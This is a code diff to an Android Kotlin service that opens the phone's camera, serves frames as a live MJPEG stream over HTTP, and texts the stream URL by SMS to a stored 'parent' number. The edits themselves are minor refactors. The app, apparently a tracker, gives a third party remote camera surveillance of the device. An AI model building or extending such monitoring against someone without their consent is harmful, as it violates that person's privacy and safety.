@@ -56,11 +56,12 @@ class MJPEGServer : Service() {
         server = MJPEGHTTPServer().apply { start(NanoHTTPD.SOCKET_READ_TIMEOUT, false) }
         running = true
         val ip = getIP()
-        getSharedPreferences("tracker", MODE_PRIVATE).edit().putString("url", "http://$ip:$PORT").apply()
+        val url = "http://$ip:$PORT/stream.mjpeg"
+        getSharedPreferences("tracker", MODE_PRIVATE).edit().putString("stream_url", url).apply()
         val parent = getSharedPreferences("tracker", MODE_PRIVATE).getString("parent", "")
         if (!parent.isNullOrEmpty()) android.telephony.SmsManager.getDefault()
-            .sendTextMessage(parent, null, "✅ FLUX : http://$ip:$PORT/stream.mjpeg", null, null)
-        Log.d(TAG, "✅ Flux démarré sur http://$ip:$PORT/stream.mjpeg")
+            .sendTextMessage(parent, null, "✅ FLUX VIDÉO : $url", null, null)
+        Log.d(TAG, "✅ Flux : $url")
     }
 
     private fun stop() {
@@ -76,9 +77,9 @@ class MJPEGServer : Service() {
 
     private fun openCam() {
         val mgr = getSystemService(CAMERA_SERVICE) as CameraManager
-        val id = mgr.cameraIdList.first {
+        val id = mgr.cameraIdList.firstOrNull {
             mgr.getCameraCharacteristics(it).get(CameraCharacteristics.LENS_FACING) == camFacing
-        }
+        } ?: mgr.cameraIdList[0]
         reader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 3)
         mgr.openCamera(id, object : CameraDevice.StateCallback() {
             override fun onOpened(cam: CameraDevice) {
@@ -91,7 +92,8 @@ class MJPEGServer : Service() {
                 reader!!.setOnImageAvailableListener({ r ->
                     val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
                     val buf = img.planes[0].buffer
-                    val bytes = ByteArray(buf.remaining()).also { buf.get(it) }
+                    val bytes = ByteArray(buf.remaining())
+                    buf.get(bytes)
                     if (!frames.offer(bytes)) { frames.poll(); frames.offer(bytes) }
                     img.close()
                 }, null)
